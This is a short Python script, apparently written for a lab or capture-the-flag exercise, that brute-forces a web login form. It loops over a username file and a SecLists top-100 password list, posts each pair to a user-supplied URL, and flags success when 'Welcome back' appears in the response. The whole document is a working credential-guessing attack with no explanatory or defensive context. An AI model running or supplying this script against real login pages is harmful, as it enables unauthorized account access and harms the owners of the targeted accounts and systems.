import sys
import requests

target = input("Write your target URL (example: http://10.10.10.10/login): ").strip()

usernames_file = "commonusernames.txt"
passwords_file = "/usr/share/seclists/Passwords/Common-Credentials/top-100.txt"
needle = "Welcome back"

with open(usernames_file, "r", encoding="latin-1") as uf:
    usernames = [line.strip() for line in uf if line.strip()]

for username in usernames:
    found = False

    with open(passwords_file, "r", encoding="latin-1") as pf:
        for password in pf:
            password = password.strip()
            if not password:
                continue

            sys.stdout.write(f"\r[X] Attempting user:password -> {username}:{password}")
            sys.stdout.flush()

            r = requests.post(target, data={"username": username, "password": password})

            if needle in r.text:
                sys.stdout.write("\n")
                print(f"[>>>>>] Valid password '{password}' found for user '{username}'")
                found = True
                break

    sys.stdout.write("\n")
    if not found:
        print(f"No password found for {username}")
